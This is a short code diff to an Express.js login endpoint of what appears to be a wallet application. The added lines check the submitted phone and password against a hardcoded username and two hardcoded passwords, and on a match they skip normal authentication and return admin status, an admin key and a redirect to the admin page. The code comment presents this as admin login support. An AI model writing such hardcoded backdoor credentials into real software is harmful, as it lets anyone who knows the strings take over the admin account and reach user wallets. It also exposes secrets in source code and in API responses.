@@ -532,9 +532,19 @@ app.post('/api/user/register', async (req, res) => {
   }
 });
 
-// REST API for User Login
+// REST API for User Login (also supports Admin username/password redirect)
 app.post('/api/user/login', async (req, res) => {
   const { phone, password } = req.body;
+  const u = (phone || '').trim();
+  const p = (password || '').trim();
+  if (u === 'wondewossenbefikaduabebe' && (p === 'wende3428@D' || p === 'wende3428')) {
+    return res.json({
+      success: true,
+      isAdmin: true,
+      adminKey: 'wende3428@D',
+      redirectTo: '/admin.html'
+    });
+  }
   try {
     const wallet = await walletManager.loginUser({ phone, password });
     res.json({
